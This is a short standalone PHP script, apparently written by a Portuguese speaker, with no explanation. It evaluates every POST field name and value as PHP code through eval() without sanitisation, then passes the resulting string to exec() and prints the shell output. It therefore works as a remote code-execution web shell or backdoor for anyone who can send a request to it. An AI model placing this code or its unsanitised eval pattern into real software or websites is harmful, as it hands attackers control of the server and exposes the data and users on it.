<?php
foreach($_POST as $nome_campo => $valor){
   $comando = "\$" . $nome_campo . "='" . $valor . "';";
   eval($comando);
}
$line1 = exec(escapeshellcmd($comando), $output, $error); 
while (list(,$line) = each($output)){ 
  echo $line, "<BR>\n"; 
} 
if ($error){ 
  echo "Código de erro: $error<BR>\n"; 
  exit; 
} 
?>
